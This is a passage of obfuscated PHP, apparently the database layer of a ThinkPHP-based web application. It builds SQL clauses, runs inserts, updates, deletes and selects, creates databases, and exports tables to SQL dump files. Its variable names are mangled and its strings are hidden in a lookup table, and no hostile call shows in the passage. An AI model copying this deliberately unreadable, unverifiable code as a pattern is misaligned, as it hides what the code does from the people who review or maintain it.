$…’îêŠ¦[338] . $this->parseWhereItem($this->parseKey($şÃ¬ïƒ), $ÍãúÏÆ) . $…’îêŠ¦[1014]; } $ÎƒŒ·´ù .= implode($…’îêŠ¦[1116], $–½ö¥¥ğ); } else { $ÎƒŒ·´ù .= $this->parseWhereItem($this->parseKey($­æõÌÈã), $Ğ„Úèö); } } $ÎƒŒ·´ù .= $…’îêŠ¦[357] . $Ğï™†õ•; } $ÎƒŒ·´ù = substr($ÎƒŒ·´ù, 0, -strlen($Ğï™†õ•)); } return empty($ÎƒŒ·´ù) ? $…’îêŠ¦[12] : $…’îêŠ¦[1122] . $ÎƒŒ·´ù; } protected function parseWhereItem($ñìï‘ìš, $Ä²¿„) { $ú‰‚ÏÔ =& $_SERVER[öæÛ¿©¿]; $ıÎÙœì = $ú‰‚ÏÔ[12]; if (is_array($Ä²¿„)) { if (is_string($Ä²¿„[0])) { $’´Á· = strtolower($Ä²¿„[0]); if (in_array($Ä²¿„[0], array($ú‰‚ÏÔ[464], $ú‰‚ÏÔ[1123], $ú‰‚ÏÔ[1124], $ú‰‚ÏÔ[1125], $ú‰‚ÏÔ[1126], $ú‰‚ÏÔ[1127]))) { $ıÎÙœì .= $ñìï‘ìš . $ú‰‚ÏÔ[53] . $Ä²¿„[0] . $ú‰‚ÏÔ[53] . $this->parseValue($Ä²¿„[1]); } elseif (preg_match($ú‰‚ÏÔ[1128], $Ä²¿„[0])) { $ıÎÙœì .= $ñìï‘ìš . $ú‰‚ÏÔ[53] . $this->exp[$’´Á·] . $ú‰‚ÏÔ[53] . $this->parseValue($Ä²¿„[1]); } elseif (preg_match($ú‰‚ÏÔ[1129], $Ä²¿„[0])) { if (is_array($Ä²¿„[1])) { $ƒ™ŠßÛ = isset($Ä²¿„[2]) ? strtoupper($Ä²¿„[2]) : $ú‰‚ÏÔ[1114]; if (in_array($ƒ™ŠßÛ, array($ú‰‚ÏÔ[1113], $ú‰‚ÏÔ[1114], $ú‰‚ÏÔ[1115]))) { $‘Ğõßåµ = array(); foreach ($Ä²¿„[1] as $˜‡äî©) { $‘Ğõßåµ[] = $ñìï‘ìš . $ú‰‚ÏÔ[53] . $this->exp[$’´Á·] . $ú‰‚ÏÔ[53] . $this->parseValue($˜‡äî©); } $ıÎÙœì .= $ú‰‚ÏÔ[338] . implode($ú‰‚ÏÔ[53] . $ƒ™ŠßÛ . $ú‰‚ÏÔ[53], $‘Ğõßåµ) . $ú‰‚ÏÔ[1014]; } } else { $ıÎÙœì .= $ñìï‘ìš . $ú‰‚ÏÔ[53] . $this->exp[$’´Á·] . $ú‰‚ÏÔ[53] . $this->parseValue($Ä²¿„[1]); } } elseif ($ú‰‚ÏÔ[373] == $’´Á·) { $ıÎÙœì .= $ú‰‚ÏÔ[1012] . $ñìï‘ìš . $ú‰‚ÏÔ[53] . $Ä²¿„[1] . $ú‰‚ÏÔ[1130]; } elseif (preg_match($ú‰‚ÏÔ[1131], $Ä²¿„[0])) { $ıÎÙœì .= $Ä²¿„[0]; } elseif (preg_match($ú‰‚ÏÔ[1132], $Ä²¿„[0])) { if (isset($Ä²¿„[2]) && $ú‰‚ÏÔ[373] == $Ä²¿„[2]) { $ıÎÙœì .= $ñìï‘ìš . $ú‰‚ÏÔ[53] . $this->exp[$’´Á·] . $ú‰‚ÏÔ[53] . $Ä²¿„[1]; } else { if (is_string($Ä²¿„[1])) { $Ä²¿„[1] = explode($ú‰‚ÏÔ[50], $Ä²¿„[1]); } $ˆ÷à‘èø = implode($ú‰‚ÏÔ[50], $this->parseValue($Ä²¿„[1])); $ıÎÙœì .= $ñìï‘ìš . $ú‰‚ÏÔ[53] . $this->exp[$’´Á·] . $ú‰‚ÏÔ[1012] . $ˆ÷à‘èø . $ú‰‚ÏÔ[1014]; } } elseif (preg_match($ú‰‚ÏÔ[1133], $Ä²¿„[0])) { $Ê¶È¤±ğ = is_string($Ä²¿„[1]) ? explode($ú‰‚ÏÔ[50], $Ä²¿„[1]) : $Ä²¿„[1]; $ıÎÙœì .= $ú‰‚ÏÔ[1012] . $ñìï‘ìš . $ú‰‚ÏÔ[53] . $this->exp[$’´Á·] . $ú‰‚ÏÔ[53] . $this->parseValue($Ê¶È¤±ğ[0]) . $ú‰‚ÏÔ[1116] . $this->parseValue($Ê¶È¤±ğ[1]) . $ú‰‚ÏÔ[357]; } else { think_exception(think_lang($ú‰‚ÏÔ[1119]) . $ú‰‚ÏÔ[4] . $Ä²¿„[0]); } } else { $ôŞ¥’øÆ = count($Ä²¿„); $µ›¬À = $ú‰‚ÏÔ[12]; if (is_string($Ä²¿„[$ôŞ¥’øÆ - 1])) { $µ›¬À = isset($Ä²¿„[$ôŞ¥’øÆ - 1]) ? strtoupper($Ä²¿„[$ôŞ¥’øÆ - 1]) : $ú‰‚ÏÔ[12]; if (in_array($µ›¬À, array($ú‰‚ÏÔ[1113], $ú‰‚ÏÔ[1114], $ú‰‚ÏÔ[1115]))) { $ôŞ¥’øÆ = $ôŞ¥’øÆ - 1; } } else { $µ›¬À = $ú‰‚ÏÔ[1113]; } for ($Çø€ãÆï = 0; $Çø€ãÆï < $ôŞ¥’øÆ; $Çø€ãÆï++) { $Ê¶È¤±ğ = is_array($Ä²¿„[$Çø€ãÆï]) ? $Ä²¿„[$Çø€ãÆï][1] : $Ä²¿„[$Çø€ãÆï]; if ($ú‰‚ÏÔ[373] == strtolower($Ä²¿„[$Çø€ãÆï][0])) { $ıÎÙœì .= $ú‰‚ÏÔ[338] . $ñìï‘ìš . $ú‰‚ÏÔ[53] . $Ê¶È¤±ğ . $ú‰‚ÏÔ[1130] . $µ›¬À . $ú‰‚ÏÔ[53]; } else { $¨•ŸÔò = is_array($Ä²¿„[$Çø€ãÆï]) ? $this->exp[strtolower($Ä²¿„[$Çø€ãÆï][0])] : $ú‰‚ÏÔ[464]; if (!$¨•ŸÔò && is_array($Ä²¿„[$Çø€ãÆï]) && in_array($Ä²¿„[$Çø€ãÆï][0], array($ú‰‚ÏÔ[464], $ú‰‚ÏÔ[1123], $ú‰‚ÏÔ[1124], $ú‰‚ÏÔ[1125], $ú‰‚ÏÔ[1126], $ú‰‚ÏÔ[1127]))) { $¨•ŸÔò = $Ä²¿„[$Çø€ãÆï][0]; } $ıÎÙœì .= $ú‰‚ÏÔ[338] . $ñìï‘ìš . $ú‰‚ÏÔ[53] . $¨•ŸÔò . $ú‰‚ÏÔ[53] . $this->parseValue($Ê¶È¤±ğ) . $ú‰‚ÏÔ[1130] . $µ›¬À . $ú‰‚ÏÔ[53]; } } $ıÎÙœì = substr($ıÎÙœì, 0, -4); } } else { $ıÎÙœì .= $ñìï‘ìš . $ú‰‚ÏÔ[1134] . $this->parseValue($Ä²¿„); } return $ıÎÙœì; } protected function parseThinkWhere($¢¬¹éÂ, $ø¢‰’íÛ) { $à±²ÏŠğ =& $_SERVER[öæÛ¿©¿]; $®×Å†š™ = $à±²ÏŠğ[12]; switch ($¢¬¹éÂ) { case $à±²ÏŠğ[428]: $®×Å†š™ = $ø¢‰’íÛ; break; case $à±²ÏŠğ[1117]: $®×Å†š™ = is_string($ø¢‰’íÛ) ? $ø¢‰’íÛ : substr($this->parseWhere($ø¢‰’íÛ), 6); break; case $à±²ÏŠğ[1135]: parse_str($ø¢‰’íÛ, $‡ÃÕİÙğ); if (isset($‡ÃÕİÙğ[$à±²ÏŠğ[1112]])) { $Å‰™¢¨® = $à±²ÏŠğ[53] . strtoupper($‡ÃÕİÙğ[$à±²ÏŠğ[1112]]) . $à±²ÏŠğ[53]; unset($‡ÃÕİÙğ[$à±²ÏŠğ[1112]]); } else { $Å‰™¢¨® = $à±²ÏŠğ[1116]; } $¢õ‹ù„Û = array(); foreach ($‡ÃÕİÙğ as $¶Å’£¤Î => $¯»¥µæë) { $¢õ‹ù„Û[] = $this->parseKey($¶Å’£¤Î) . $à±²ÏŠğ[1134] . $this->parseValue($¯»¥µæë); } $®×Å†š™ = implode($Å‰™¢¨®, $¢õ‹ù„Û); break; } return $®×Å†š™; } protected function parseLimit($Ç™”·¸í) { $‡Îù¡í§ =& $_SERVER[öæÛ¿©¿]; return !empty($Ç™”·¸í) ? $‡Îù¡í§[51] . $Ç™”·¸í . $‡Îù¡í§[53] : $‡Îù¡í§[12]; } protected function parseJoin($¾¦Ó²ù) { $‡ÆÌ²ªØ =& $_SERVER[öæÛ¿©¿]; $¹ŞÊñá = $‡ÆÌ²ªØ[12]; if (!empty($¾¦Ó²ù)) { if (is_array($¾¦Ó²ù)) { foreach ($¾¦Ó²ù as $Û¡äıÃ => $ç«›°€Ï) { if (!1 !== stripos($ç«›°€Ï, $‡ÆÌ²ªØ[1136])) { $¹ŞÊñá .= $‡ÆÌ²ªØ[53] . $ç«›°€Ï; } else { $¹ŞÊñá .= $‡ÆÌ²ªØ[1137] . $ç«›°€Ï; } } } else { $¹ŞÊñá .= $‡ÆÌ²ªØ[1137] . $¾¦Ó²ù; } } $¹ŞÊñá = preg_replace($‡ÆÌ²ªØ[1138], think_config($‡ÆÌ²ªØ[1042]) . $‡ÆÌ²ªØ[1139], $¹ŞÊñá); return $¹ŞÊñá; } protected function parseOrder($˜Èü¥Ô©) { $îÂ© =& $_SERVER[öæÛ¿©¿]; if (is_array($˜Èü¥Ô©)) { $ñÊßÄ‚Ï = array(); foreach ($˜Èü¥Ô© as $ŒÎåö¹Š => $üÌûÀÜ®) { if (is_numeric($ŒÎåö¹Š)) { $ñÊßÄ‚Ï[] = $this->parseKey($üÌûÀÜ®); } else { $üÌûÀÜ® = in_array(strtoupper(trim($üÌûÀÜ®)), array($îÂ©[1140], $îÂ©[1141])) ? $îÂ©[53] . $üÌûÀÜ® : $îÂ©[12]; if (preg_match($îÂ©[1142], $ŒÎåö¹Š)) { $ñÊßÄ‚Ï[] = $this->parseKey($ŒÎåö¹Š) . $üÌûÀÜ®; } else { think_exception($îÂ©[1143] . $ŒÎåö¹Š); } } } $˜Èü¥Ô© = implode($îÂ©[50], $ñÊßÄ‚Ï); } return !empty($˜Èü¥Ô©) ? $îÂ©[1144] . $˜Èü¥Ô© : $îÂ©[12]; } protected function parseGroup($³ÎÆû£Â) { $ğ™Ì¸Ô¬ =& $_SERVER[öæÛ¿©¿]; return !empty($³ÎÆû£Â) ? $ğ™Ì¸Ô¬[1145] . $³ÎÆû£Â : $ğ™Ì¸Ô¬[12]; } protected function parseHaving($­ÎÃÛ¤õ) { $©Äƒ¢ÊŠ =& $_SERVER[öæÛ¿©¿]; return !empty($­ÎÃÛ¤õ) ? $©Äƒ¢ÊŠ[1146] . $­ÎÃÛ¤õ : $©Äƒ¢ÊŠ[12]; } protected function parseComment($âş®â‹) { $¨İÕäñ =& $_SERVER[öæÛ¿©¿]; return !empty($âş®â‹) ? $¨İÕäñ[1147] . $âş®â‹ . $¨İÕäñ[1148] : $¨İÕäñ[12]; } protected function parseDistinct($¢ÖàÛ·É) { $ùµ¤¢úü =& $_SERVER[öæÛ¿©¿]; return !empty($¢ÖàÛ·É) ? $ùµ¤¢úü[1149] : $ùµ¤¢úü[12]; } protected function parseUnion($³½““ˆà) { $£ÇïÂÁş =& $_SERVER[öæÛ¿©¿]; if (empty($³½““ˆà)) { return $£ÇïÂÁş[12]; } if (isset($³½““ˆà[$£ÇïÂÁş[424]])) { $ôœ¤±éœ = $£ÇïÂÁş[1150]; unset($³½““ˆà[$£ÇïÂÁş[424]]); } else { $ôœ¤±éœ = $£ÇïÂÁş[1151]; } foreach ($³½““ˆà as $”ƒÈš°´) { $¾ıÏªÉÜ[] = $ôœ¤±éœ . (is_array($”ƒÈš°´) ? $this->buildSelectSql($”ƒÈš°´) : $”ƒÈš°´); } return implode($£ÇïÂÁş[53], $¾ıÏªÉÜ); } public function insert($´¯½ş£, $ÙÈëÔ±ì = array(), $Õò‰âœ— = false) { $æè¢¶ =& $_SERVER[öæÛ¿©¿]; $¬ò±·°™ = $¦õ†õÇÌ = array(); $this->model = $ÙÈëÔ±ì[$æè¢¶[360]]; foreach ($´¯½ş£ as $¼öá¶¯ê => $Ü´ºÄ‘¾) { if (is_array($Ü´ºÄ‘¾) && $æè¢¶[373] == $Ü´ºÄ‘¾[0]) { $¦õ†õÇÌ[] = $this->parseKey($¼öá¶¯ê); $¬ò±·°™[] = $Ü´ºÄ‘¾[1]; } elseif (is_scalar($Ü´ºÄ‘¾) || is_null($Ü´ºÄ‘¾)) { $¦õ†õÇÌ[] = $this->parseKey($¼öá¶¯ê); $¬ò±·°™[] = $this->parseValue($Ü´ºÄ‘¾); } } $œ­•åÑ¼ = ($Õò‰âœ— ? $æè¢¶[1016] : $æè¢¶[1017]) . $æè¢¶[1018] . $this->parseTable($ÙÈëÔ±ì[$æè¢¶[358]]) . $æè¢¶[1012] . implode($æè¢¶[50], $¦õ†õÇÌ) . $æè¢¶[1013] . implode($æè¢¶[50], $¬ò±·°™) . $æè¢¶[1014]; $œ­•åÑ¼ .= $this->parseLock(isset($ÙÈëÔ±ì[$æè¢¶[947]]) ? $ÙÈëÔ±ì[$æè¢¶[947]] : !1); $œ­•åÑ¼ .= $this->parseComment(!empty($ÙÈëÔ±ì[$æè¢¶[430]]) ? $ÙÈëÔ±ì[$æè¢¶[430]] : $æè¢¶[12]); return $this->execute($œ­•åÑ¼, $this->parseBind(!empty($ÙÈëÔ±ì[$æè¢¶[362]]) ? $ÙÈëÔ±ì[$æè¢¶[362]] : array())); } public function selectInsert($ÎÕÂ‹İò, $ì‹ü”Ë¡, $ê”«İ× = array()) { $æÕàõñ¨ =& $_SERVER[öæÛ¿©¿]; $this->model = $ê”«İ×[$æÕàõñ¨[360]]; if (is_string($ÎÕÂ‹İò)) { $ÎÕÂ‹İò = explode($æÕàõñ¨[50], $ÎÕÂ‹İò); } array_walk($ÎÕÂ‹İò, array($this, $æÕàõñ¨[1015])); $Ğ‚ÀğËØ = $æÕàõñ¨[1152] . $this->parseTable($ì‹ü”Ë¡) . $æÕàõñ¨[1012] . implode($æÕàõñ¨[50], $ÎÕÂ‹İò) . $æÕàõñ¨[1130]; $Ğ‚ÀğËØ .= $this->buildSelectSql($ê”«İ×); return $this->execute($Ğ‚ÀğËØ, $this->parseBind(!empty($ê”«İ×[$æÕàõñ¨[362]]) ? $ê”«İ×[$æÕàõñ¨[362]] : array())); } public function update($´üç§·•, $×Ã¬¹£) { $ºßçŸº’ =& $_SERVER[öæÛ¿©¿]; $this->model = $×Ã¬¹£[$ºßçŸº’[360]]; $Ã¼ÕÚø¡ = $ºßçŸº’[1153] . $this->parseTable($×Ã¬¹£[$ºßçŸº’[358]]) . $this->parseSet($´üç§·•) . $this->parseWhere(!empty($×Ã¬¹£[$ºßçŸº’[354]]) ? $×Ã¬¹£[$ºßçŸº’[354]] : $ºßçŸº’[12]) . $this->parseOrder(!empty($×Ã¬¹£[$ºßçŸº’[442]]) ? $×Ã¬¹£[$ºßçŸº’[442]] : $ºßçŸº’[12]) . $this->parseLimit(!empty($×Ã¬¹£[$ºßçŸº’[369]]) ? $×Ã¬¹£[$ºßçŸº’[369]] : $ºßçŸº’[12]) . $this->parseLock(isset($×Ã¬¹£[$ºßçŸº’[947]]) ? $×Ã¬¹£[$ºßçŸº’[947]] : !1) . $this->parseComment(!empty($×Ã¬¹£[$ºßçŸº’[430]]) ? $×Ã¬¹£[$ºßçŸº’[430]] : $ºßçŸº’[12]); return $this->execute($Ã¼ÕÚø¡, $this->parseBind(!empty($×Ã¬¹£[$ºßçŸº’[362]]) ? $×Ã¬¹£[$ºßçŸº’[362]] : array())); } public function delete($íâ¥Ûª… = array()) { $…ÅÙŞ =& $_SERVER[öæÛ¿©¿]; $this->model = $íâ¥Ûª…[$…ÅÙŞ[360]]; $ŠÍ¢¯“§ = $…ÅÙŞ[1154] . $this->parseTable($íâ¥Ûª…[$…ÅÙŞ[358]]) . $this->parseWhere(!empty($íâ¥Ûª…[$…ÅÙŞ[354]]) ? $íâ¥Ûª…[$…ÅÙŞ[354]] : $…ÅÙŞ[12]) . $this->parseOrder(!empty($íâ¥Ûª…[$…ÅÙŞ[442]]) ? $íâ¥Ûª…[$…ÅÙŞ[442]] : $…ÅÙŞ[12]) . $this->parseLimit(!empty($íâ¥Ûª…[$…ÅÙŞ[369]]) ? $íâ¥Ûª…[$…ÅÙŞ[369]] : $…ÅÙŞ[12]) . $this->parseLock(isset($íâ¥Ûª…[$…ÅÙŞ[947]]) ? $íâ¥Ûª…[$…ÅÙŞ[947]] : !1) . $this->parseComment(!empty($íâ¥Ûª…[$…ÅÙŞ[430]]) ? $íâ¥Ûª…[$…ÅÙŞ[430]] : $…ÅÙŞ[12]); return $this->execute($ŠÍ¢¯“§, $this->parseBind(!empty($íâ¥Ûª…[$…ÅÙŞ[362]]) ? $íâ¥Ûª…[$…ÅÙŞ[362]] : array())); } public function select($çºªÀæè = array()) { $êĞôñ¡× =& $_SERVER[öæÛ¿©¿]; $this->model = $çºªÀæè[$êĞôñ¡×[360]]; $ñÃÒ’ªŒ = $this->buildSelectSql($çºªÀæè); $ªÆÊÑÀÙ = isset($çºªÀæè[$êĞôñ¡×[425]]) ? $çºªÀæè[$êĞôñ¡×[425]] : !1; if ($ªÆÊÑÀÙ) { $œ¬Ÿåóñ = is_string($ªÆÊÑÀÙ[$êĞôñ¡×[95]]) ? $ªÆÊÑÀÙ[$êĞôñ¡×[95]] : $êĞôñ¡×[1155] . md5($ñÃÒ’ªŒ); $‹ŒÔ‚Şü = think_cache($œ¬Ÿåóñ, $êĞôñ¡×[12], $ªÆÊÑÀÙ); if (!1 !== $‹ŒÔ‚Şü) { return $‹ŒÔ‚Şü; } } $™Ûğ®½´ = $this->query($ñÃÒ’ªŒ, $this->parseBind(!empty($çºªÀæè[$êĞôñ¡×[362]]) ? $çºªÀæè[$êĞôñ¡×[362]] : array())); if ($ªÆÊÑÀÙ && !1 !== $™Ûğ®½´) { think_cache($œ¬Ÿåóñ, $™Ûğ®½´, $ªÆÊÑÀÙ); } return $™Ûğ®½´; } public function buildSelectSql($êíñÍ‡÷ = array()) { $Â§ó²º‹ =& $_SERVER[öæÛ¿©¿]; if (isset($êíñÍ‡÷[$Â§ó²º‹[429]])) { if (strpos($êíñÍ‡÷[$Â§ó²º‹[429]], $Â§ó²º‹[50])) { list($‘ÅùÛ¾©, $¨¾½ÕŒı) = explode($Â§ó²º‹[50], $êíñÍ‡÷[$Â§ó²º‹[429]]); } else { $‘ÅùÛ¾© = $êíñÍ‡÷[$Â§ó²º‹[429]]; } $‘ÅùÛ¾© = $‘ÅùÛ¾© ? $‘ÅùÛ¾© : 1; $¨¾½ÕŒı = isset($¨¾½ÕŒı) ? $¨¾½ÕŒı : (is_numeric($êíñÍ‡÷[$Â§ó²º‹[369]]) ? $êíñÍ‡÷[$Â§ó²º‹[369]] : 20); $§ıéˆñ¨ = $¨¾½ÕŒı * ((int) $‘ÅùÛ¾© - 1); $êíñÍ‡÷[$Â§ó²º‹[369]] = $§ıéˆñ¨ . $Â§ó²º‹[50] . $¨¾½ÕŒı; } if (think_config($Â§ó²º‹[1156])) { $èÔ÷¼ºÁ = $Â§ó²º‹[1157] . md5(serialize($êíñÍ‡÷)); $„ØÓò˜ä = think_cache($èÔ÷¼ºÁ); if ($„ØÓò˜ä) { return $„ØÓò˜ä; } } $ÃÇ¿×ã = $this->parseSql($this->selectSql, $êíñÍ‡÷); $ÃÇ¿×ã .= $this->parseLock(isset($êíñÍ‡÷[$Â§ó²º‹[947]]) ? $êíñÍ‡÷[$Â§ó²º‹[947]] : !1); if (isset($èÔ÷¼ºÁ)) { think_cache($èÔ÷¼ºÁ, $ÃÇ¿×ã); } return $ÃÇ¿×ã; } public function parseSql($œéÓéèÙ, $óˆãŠœ = array()) { $àÓ½Ùïæ =& $_SERVER[öæÛ¿©¿]; $œéÓéèÙ = str_replace(array($àÓ½Ùïæ[1158], $àÓ½Ùïæ[1159], $àÓ½Ùïæ[1160], $àÓ½Ùïæ[1161], $àÓ½Ùïæ[1162], $àÓ½Ùïæ[1163], $àÓ½Ùïæ[1164], $àÓ½Ùïæ[1165], $àÓ½Ùïæ[1166], $àÓ½Ùïæ[1167], $àÓ½Ùïæ[1168]), array($this->parseTable("{$óˆãŠœ[$àÓ½Ùïæ[358]]}"), $this->parseDistinct(isset($óˆãŠœ[$àÓ½Ùïæ[1169]]) ? $óˆãŠœ[$àÓ½Ùïæ[1169]] : !1), $this->parseField(!empty($óˆãŠœ[$àÓ½Ùïæ[352]]) ? $óˆãŠœ[$àÓ½Ùïæ[352]] : $àÓ½Ùïæ[221]), $this->parseJoin(!empty($óˆãŠœ[$àÓ½Ùïæ[361]]) ? $óˆãŠœ[$àÓ½Ùïæ[361]] : $àÓ½Ùïæ[12]), $this->parseWhere(!empty($óˆãŠœ[$àÓ½Ùïæ[354]]) ? $óˆãŠœ[$àÓ½Ùïæ[354]] : $àÓ½Ùïæ[12]), $this->parseGroup(!empty($óˆãŠœ[$àÓ½Ùïæ[594]]) ? $óˆãŠœ[$àÓ½Ùïæ[594]] : $àÓ½Ùïæ[12]), $this->parseHaving(!empty($óˆãŠœ[$àÓ½Ùïæ[1170]]) ? $óˆãŠœ[$àÓ½Ùïæ[1170]] : $àÓ½Ùïæ[12]), $this->parseOrder(!empty($óˆãŠœ[$àÓ½Ùïæ[442]]) ? $óˆãŠœ[$àÓ½Ùïæ[442]] : $àÓ½Ùïæ[12]), $this->parseLimit(!empty($óˆãŠœ[$àÓ½Ùïæ[369]]) ? $óˆãŠœ[$àÓ½Ùïæ[369]] : $àÓ½Ùïæ[12]), $this->parseUnion(!empty($óˆãŠœ[$àÓ½Ùïæ[423]]) ? $óˆãŠœ[$àÓ½Ùïæ[423]] : $àÓ½Ùïæ[12]), $this->parseComment(!empty($óˆãŠœ[$àÓ½Ùïæ[430]]) ? $óˆãŠœ[$àÓ½Ùïæ[430]] : $àÓ½Ùïæ[12])), $œéÓéèÙ); return $œéÓéèÙ; } public function getLastSql($™×º¬‡ó = '') { return $™×º¬‡ó ? $this->modelSql[$™×º¬‡ó] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ş©·ºş¡) { return addslashes($Ş©·ºş¡); } public function setModel($š¸àÆ°) { $this->model = $š¸àÆ°; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($—ê…é– = array()) { $ñŸËüĞ¸ =& $_SERVER[öæÛ¿©¿]; if (empty($—ê…é–)) { $—ê…é– = $GLOBALS[$ñŸËüĞ¸[6]][$ñŸËüĞ¸[21]]; } $this->database = $—ê…é–; } public function model($ ‚íß¹ª = '') { return new ModelBase($ ‚íß¹ª, $_SERVER[öæÛ¿©¿][12], $this->database); } public function db($š±Ã‚™É = false) { $ƒ‰ÒÈ¥‹ =& $_SERVER[öæÛ¿©¿]; $«Œ»ûà’ = array_change_key_case($this->database); if ($this->dbType() == $ƒ‰ÒÈ¥‹[13] || !$š±Ã‚™É) { return $this->model()->db(); } $àª×úÄÚ = $«Œ»ûà’[$ƒ‰ÒÈ¥‹[1084]]; $«Œ»ûà’[$ƒ‰ÒÈ¥‹[1084]] = $ƒ‰ÒÈ¥‹[12]; if ($«Œ»ûà’[$ƒ‰ÒÈ¥‹[1079]] == $ƒ‰ÒÈ¥‹[1076]) { $—¯âå = $«Œ»ûà’[$ƒ‰ÒÈ¥‹[1085]]; $«Œ»ûà’[$ƒ‰ÒÈ¥‹[1085]] = substr($—¯âå, 0, strrpos($—¯âå, $ƒ‰ÒÈ¥‹[1171])); } $this->database = $«Œ»ûà’; $ùÊ¬Æœ = $this->model()->db(); try { $öÏç‰¥ = $ùÊ¬Æœ->execute("\x73\x68\x6f\x77\40\144\141\x74\141\142\141\x73\145\x73\40\x6c\x69\x6b\145\x20\47{$àª×úÄÚ}\47"); } catch (Exception $–øö°Ş£) { } if (!$öÏç‰¥) { $ùÊ¬Æœ->execute("\143\162\x65\x61\x74\145\x20\144\141\164\x61\x62\x61\x73\x65\40\x60{$àª×úÄÚ}\140"); } $«Œ»ûà’[$ƒ‰ÒÈ¥‹[1084]] = $àª×úÄÚ; if ($«Œ»ûà’[$ƒ‰ÒÈ¥‹[1079]] == $ƒ‰ÒÈ¥‹[1076]) { $«Œ»ûà’[$ƒ‰ÒÈ¥‹[1085]] .= $ƒ‰ÒÈ¥‹[1171] . $àª×úÄÚ; } $this->database = $«Œ»ûà’; $ùÊ¬Æœ->execute("\x75\x73\145\x20\140{$àª×úÄÚ}\140"); return $ùÊ¬Æœ; } public function createTable($àµÃğ®Ë, &$£äó×İ) { $Ò¸·Öä§ =& $_SERVER[öæÛ¿©¿]; if (!IO::exist($àµÃğ®Ë)) { show_json(LNG($Ò¸·Öä§[1172]), !1); } $ú¨é›†Õ = $this->model()->db(); $¶àÁøôñ = sqlSplit(IO::getContent($àµÃğ®Ë)); foreach ($¶àÁøôñ as $“‘«“÷®) { $àÒ²áŸ = stripos($“‘«“÷®, $Ò¸·Öä§[1173]) === 0; if ($àÒ²áŸ) { $£äó×İ->task[$Ò¸·Öä§[1174]] += 1; } $ú¨é›†Õ->execute($“‘«“÷®); if ($àÒ²áŸ) { preg_match($Ò¸·Öä§[1175], $“‘«“÷®, $´Æ¿˜¿Ó); $£äó×İ->task[$Ò¸·Öä§[1176]] = $´Æ¿˜¿Ó[1]; $£äó×İ->update(1); } } } public function insertTable($ëó“ğñá, &$¸¶¦£äØ) { $äœ£à½š =& $_SERVER[öæÛ¿©¿]; $ôİÒ‘±Æ = $this->model()->db(); $±ìÃ™é = $–Äµ€‡‘ ? array($–Äµ€‡‘) : $ôİÒ‘±Æ->getTables(); foreach ($ëó“ğñá as $‰ëŞ©œÅ) { $–Äµ€‡‘ = basename($‰ëŞ©œÅ, $äœ£à½š[885]); if (!in_array($–Äµ€‡‘, $±ìÃ™é)) { continue; } $¸¶¦£äØ->task[$äœ£à½š[1176]] = $–Äµ€‡‘; if ($–Äµ€‡‘ == $äœ£à½š[879]) { continue; } if (get_filesize($‰ëŞ©œÅ) == 0) { continue; } $Ç¤­»Ö° = $this->sqlToDb($‰ëŞ©œÅ, $¸¶¦£äØ); if (!$Ç¤­»Ö°) { show_json(LNG($äœ£à½š[1177]) . "\133{$–Äµ€‡‘}\x5d", !1); } } } public function sqlFromDb($£ñãŒù£, $·Àƒ«úô, &$¹ Š½Â°, $øÛ¸¶‹ = '') { if ($¹ Š½Â°) { $¹ Š½Â°->task[$_SERVER[öæÛ¿©¿][1176]] = $£ñãŒù£; } $³£…íŞ = $this->model($£ñãŒù£); $µÕ˜Åò = 0; $èş×›‰ = 0; $¥Ï¯àîè = 10000; $¸ŞüşŒ¢ = fopen($·Àƒ«úô, $_SERVER[öæÛ¿©¿][1178]); $í¡Œ¸ˆï = $³£…íŞ->getPk(); $Øßø³ºì = $³£…íŞ->getDbFields(); $°õ¿Ş© = $_SERVER[öæÛ¿©¿][12]; if ($GLOBALS[$_SERVER[öæÛ¿©¿][884]] && in_array($£ñãŒù£, array($_SERVER[öæÛ¿©¿][1179], $_SERVER[öæÛ¿©¿][1180]))) { $°õ¿Ş© = $£ñãŒù£; } do { $ÕôÀ•ô³ = array($í¡Œ¸ˆï => array($_SERVER[öæÛ¿©¿][1126], $èş×›‰)); $˜ğÓèé­ = $³£…íŞ->where($ÕôÀ•ô³)->field($Øßø³ºì)->order($í¡Œ¸ˆï . $_SERVER[öæÛ¿©¿][1181])->limit($¥Ï¯àîè)->select(); $˜ğÓèé­ = !empty($˜ğÓèé­) ? $˜ğÓèé­ : array(); if (!($å¸Ä»¨ú = count($˜ğÓèé­))) { break; } $½’ŠšÄÍ = end($˜ğÓèé­); $èş×›‰ = $½’ŠšÄÍ[$í¡Œ¸ˆï]; $å‹çÙ¦ = array(); foreach ($˜ğÓèé­ as $“‰í¨) { if ($°õ¿Ş©) { if ($£ñãŒù£ == $_SERVER[öæÛ¿©¿][1179]) { if ($“‰í¨[$_SERVER[öæÛ¿©¿][33]] == $_SERVER[öæÛ¿©¿][1182]) { $·Ÿ¢”³Ô = json_decode($“‰í¨[$_SERVER[öæÛ¿©¿][451]], !0); if ($·Ÿ¢”³Ô[$_SERVER[öæÛ¿©¿][32]] == $GLOBALS[$_SERVER[öæÛ¿©¿][884]] && $·Ÿ¢”³Ô[$_SERVER[öæÛ¿©¿][842]] != 1) { continue; } } } else { if ($“‰í¨[$_SERVER[öæÛ¿©¿][33]] == $_SERVER[öæÛ¿©¿][1183] && $“‰í¨[$_SERVER[öæÛ¿©¿][95]] == $_SERVER[öæÛ¿©¿][880]) { continue; } } } if ($øÛ¸¶‹) { $“‰í¨[$_SERVER[öæÛ¿©¿][87]] = "\173\x69\157\72{$øÛ¸¶‹}\175" . substr($“‰í¨[$_SERVER[öæÛ¿©¿][87]], strlen("\173\151\157\x3a{$“‰í¨[$_SERVER[öæÛ¿©¿][918]]}\x7d")); $“‰í¨[$_SERVER[öæÛ¿©¿][918]] = $øÛ¸¶‹; } $å‹çÙ¦[] = $_SERVER[öæÛ¿©¿][1184] . $this->sqlEncode($“‰í¨) . $_SERVER[öæÛ¿©¿][1185]; } $·ÏŒ¨Û = "\111\116\123\105\x52\124\x20\x49\x4e\x54\117\x20\x60{$£ñãŒù£}\140\x20\50\140" . implode($_SERVER[öæÛ¿©¿][1186], $Øßø³ºì) . $_SERVER[öæÛ¿©¿][1187]; fwrite($¸ŞüşŒ¢, $·ÏŒ¨Û . implode($_SERVER[öæÛ¿©¿][1188], $å‹çÙ¦) . $_SERVER[öæÛ¿©¿][74] . PHP_EOL); $µÕ˜Åò += $å¸Ä»¨ú; if ($¹ Š½Â°) { $¹ Š½Â°->update($å¸Ä»¨ú); } } while 